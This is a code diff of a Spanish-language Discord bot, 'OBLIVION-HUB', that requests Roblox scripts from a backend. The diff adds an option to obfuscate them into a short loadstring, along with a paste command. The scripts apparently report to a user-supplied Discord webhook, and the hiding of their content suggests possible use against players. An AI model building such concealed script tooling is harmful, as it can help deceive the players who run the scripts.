@@ -1,4 +1,4 @@
-const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');
+const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder } = require('discord.js');
 const express = require('express');
 const fetch = require('node-fetch');
 
@@ -25,7 +25,7 @@ const client = new Client({
 //  DEFINICIÓN DE COMANDOS SLASH
 // ============================================================
 const commands = [
-    // Comando principal: generate
+    // Comando principal: generate (con opción de ofuscar)
     new SlashCommandBuilder()
         .setName('generate')
         .setDescription('Genera un script de OBLIVION con tus selecciones')
@@ -63,6 +63,10 @@ const commands = [
         .addStringOption(option =>
             option.setName('custom_code')
                 .setDescription('Código personalizado (solo si modo Custom)')
+                .setRequired(false))
+        .addBooleanOption(option =>
+            option.setName('obfuscate')
+                .setDescription('¿Ofuscar el script y usar Pastefy? (requiere autenticación)')
                 .setRequired(false)),
 
     // Comando de ayuda
@@ -77,7 +81,24 @@ const commands = [
         .addStringOption(option =>
             option.setName('url')
                 .setDescription('URL del webhook de Discord')
+                .setRequired(true)),
+
+    // Comando para crear paste interno
+    new SlashCommandBuilder()
+        .setName('paste')
+        .setDescription('Crea un paste de texto en OBLIVION-HUB')
+        .addStringOption(option =>
+            option.setName('content')
+                .setDescription('El contenido del paste')
                 .setRequired(true))
+        .addStringOption(option =>
+            option.setName('title')
+                .setDescription('Título del paste (opcional)')
+                .setRequired(false))
+        .addBooleanOption(option =>
+            option.setName('public')
+                .setDescription('¿Público o solo visible para ti?')
+                .setRequired(false))
 ];
 
 // ============================================================
@@ -107,24 +128,24 @@ client.on('interactionCreate', async interaction => {
 
     // ---- HELP ----
     if (commandName === 'help') {
-        await interaction.reply({
-            content: `🤖 **OBLIVION-HUB Bot**\n\n` +
-                    `**Comandos disponibles:**\n` +
-                    `\`/generate\` - Genera un script con tus selecciones\n` +
-                    `\`/webhook\` - Guarda tu webhook para usarlo siempre\n` +
-                    `\`/help\` - Muestra esta ayuda\n\n` +
-                    `📌 **Ejemplo de uso:**\n` +
-                    `/generate username:cxior0 mode:normal brainrots:Headless Horseman,Meowl`,
-            ephemeral: true
-        });
+        const embed = new EmbedBuilder()
+            .setTitle('🟥 OBLIVION-HUB Bot')
+            .setDescription('Genera scripts de Roblox directamente desde Discord')
+            .setColor('#DC2626')
+            .addFields(
+                { name: '/generate', value: 'Genera un script con tus selecciones\n`/generate username:... obfuscate:true`', inline: false },
+                { name: '/webhook', value: 'Guarda tu webhook para usarlo siempre', inline: false },
+                { name: '/paste', value: 'Crea un paste de texto en OBLIVION-HUB', inline: false },
+                { name: '/help', value: 'Muestra esta ayuda', inline: false }
+            )
+            .setFooter({ text: 'OBLIVION-HUB © 2026' });
+        await interaction.reply({ embeds: [embed], ephemeral: true });
         return;
     }
 
     // ---- WEBHOOK ----
     if (commandName === 'webhook') {
         const url = options.getString('url');
-        // Guardar webhook en memoria (para pruebas) o en base de datos
-        // Por ahora, lo guardamos en un Map global
         if (!client.userWebhooks) {
             client.userWebhooks = new Map();
         }
@@ -136,12 +157,47 @@ client.on('interactionCreate', async interaction => {
         return;
     }
 
+    // ---- PASTE ----
+    if (commandName === 'paste') {
+        await interaction.deferReply({ ephemeral: false });
+
+        const content = options.getString('content');
+        const title = options.getString('title') || 'Untitled';
+        const isPublic = options.getBoolean('public') || false;
+
+        try {
+            const response = await fetch(`${API_URL}/api/paste`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content,
+                    title,
+                    userId: isPublic ? null : user.id,
+                    public: isPublic
+                })
+            });
+
+            const data = await response.json();
+
+            if (!response.ok) {
+                throw new Error(data.error || 'Error al crear el paste');
+            }
+
+            await interaction.editReply({
+                content: `✅ **Paste creado!**\n🔗 ${data.url}\n📌 Título: ${data.title}\n🔒 ${isPublic ? 'Público' : 'Privado (solo tú puedes verlo)'}`
+            });
+
+        } catch (error) {
+            await interaction.editReply({ content: `❌ Error al crear el paste: ${error.message}` });
+        }
+        return;
+    }
+
     // ---- GENERATE ----
     if (commandName === 'generate') {
         await interaction.deferReply({ ephemeral: false });
 
         try {
-            // Obtener parámetros
             const username = options.getString('username');
             let webhook = options.getString('webhook') || '';
             const mode = options.getString('mode') || 'normal';
@@ -149,6 +205,7 @@ client.on('interactionCreate', async interaction => {
             const skins = options.getString('skins')?.split(',').map(s => s.trim()).filter(Boolean) || [];
             const gears = options.getString('gears')?.split(',').map(s => s.trim()).filter(Boolean) || [];
             const customCode = options.getString('custom_code') || '';
+            const obfuscate = options.getBoolean('obfuscate') || false;
 
             // Si no se proporcionó webhook, intentar obtener el guardado
             if (!webhook && client.userWebhooks?.has(user.id)) {
@@ -167,7 +224,8 @@ client.on('interactionCreate', async interaction => {
                     skins,
                     gears,
                     customCode,
-                    shortEnabled: false
+                    shortEnabled: obfuscate,
+                    userId: user.id
                 })
             });
 
@@ -177,9 +235,17 @@ client.on('interactionCreate', async interaction => {
                 throw new Error(data.error || 'Error en la API');
             }
 
+            // Si está ofuscado, mostrar el loadstring corto
+            if (obfuscate && data.loadstring) {
+                await interaction.editReply({
+                    content: `🔐 **Script ofuscado generado para ${username}**\n\`\`\`lua\n${data.loadstring}\n\`\`\``
+                });
+                return;
+            }
+
+            // Si no está ofuscado, mostrar el script completo
             const script = data.script || 'No se pudo generar el script.';
 
-            // Enviar el script (manejar scripts largos)
             if (script.length > 1900) {
                 const parts = script.match(/[\s\S]{1,1900}/g) || [];
                 await interaction.editReply(`📄 **Script generado para ${username}** (muy largo, enviado en partes):`);
